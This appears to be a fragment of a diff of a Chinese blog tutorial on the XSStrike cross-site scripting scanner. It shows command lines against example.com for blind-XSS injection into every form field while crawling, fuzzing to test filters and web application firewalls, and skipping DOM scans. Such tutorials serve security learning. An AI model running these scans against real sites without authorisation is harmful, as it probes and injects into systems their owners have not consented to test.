 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py -u &quot;http://example.com/page.php&quot; --params</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>7.盲xss：爬行中使用此参数可向每个html表单里面的每个变量插入xss代码</p>
+7.盲xss：爬行中使用此参数可向每个html表单里面的每个变量插入xss代码
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py -u http://example.com/page.php?q=query --crawl --blind</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>8.模糊测试-fuzzer<br>该模糊器旨在测试过滤器和Web应用程序防火墙，可使用-d选项将延迟设置为1秒。</p>
+8.模糊测试-fuzzer
+该模糊器旨在测试过滤器和Web应用程序防火墙，可使用-d选项将延迟设置为1秒。
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py -u &quot;http://example.com/search.php?q=query&quot; --fuzzer</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>9.跳过DOM扫描<br>在爬网时可跳过DOM xss扫描，以节省时间</p>
+9.跳过DOM扫描
+在爬网时可跳过DOM xss扫描，以节省时间
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python xsstrike.py -u &quot;http://example.com/search.php?q=query&quot; --skip-dom</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>大概就是这样内容了，xss要难的话可以很难<br>多做题，多总结</p>
-
+# 小结
+大概就是这样内容了，xss要难的话可以很难
+多做题，多总结
                 
             </div>
             <hr/>
